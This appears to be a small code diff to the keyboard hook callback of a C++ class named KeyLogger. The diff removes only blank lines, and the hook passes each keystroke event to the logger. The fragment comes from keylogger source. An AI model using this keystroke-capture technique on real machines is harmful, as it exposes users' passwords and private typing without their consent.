@@ -3,9 +3,7 @@
 LRESULT CALLBACK KeyboardProc(int code, WPARAM wParam, LPARAM lParam) {
 	if (code < 0)
 		return CallNextHookEx(NULL, code, wParam, lParam);
-
 	KeyLogger::getInstance().onKeyboardEvent(code, wParam, lParam);
-
 	return CallNextHookEx(KeyLogger::getInstance().m_hook, code, wParam, lParam);
 }
 
